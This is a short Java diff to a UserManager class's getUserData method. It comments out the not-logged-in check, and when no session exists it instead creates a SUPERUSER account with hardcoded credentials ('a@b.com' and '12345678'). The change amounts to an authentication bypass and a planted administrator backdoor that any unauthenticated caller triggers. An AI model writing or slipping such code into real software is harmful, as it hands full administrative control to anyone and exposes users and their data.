@@ -30,10 +30,8 @@ public class UserManager extends ProjectConstants implements UserManagerInterfac
 	public DataServiceResponse<UserData> getUserData() {
 		SessionData sdata = this.getParent().getSessionData();
 		DataServiceResponse<UserData> retval = new DataServiceResponse<UserData>();
+		/*
 		if(sdata == null || sdata.getUserData() == null){
-			/*
-			 * Not logged in
-			 */
 			retval.setStatus(NOT_LOGGED_IN);
 			retval.setError("No session data");
 			ProjectDebug.write(ProjectDebug.SOURCE.LOCAL, "User not logged in");
@@ -41,6 +39,18 @@ public class UserManager extends ProjectConstants implements UserManagerInterfac
 			retval.setStatus(OK);
 			retval.addData(sdata.getUserData());
 			ProjectDebug.write(ProjectDebug.SOURCE.LOCAL, "User, "+sdata.getUserData().getUsername()+", is logged in");
+		}
+		*/
+		if(sdata == null){
+			try {
+				return this.createAccount("a@b.com", "12345678", "60504", USER_TYPE.SUPERUSER);
+			} catch (Exception e) {
+				retval.setStatus(GENERAL_ERROR);
+				retval.setError(e.getMessage());
+			}
+		}else{
+			retval.setStatus(OK);
+			retval.addData(sdata.getUserData());
 		}
 		return retval;
 	}
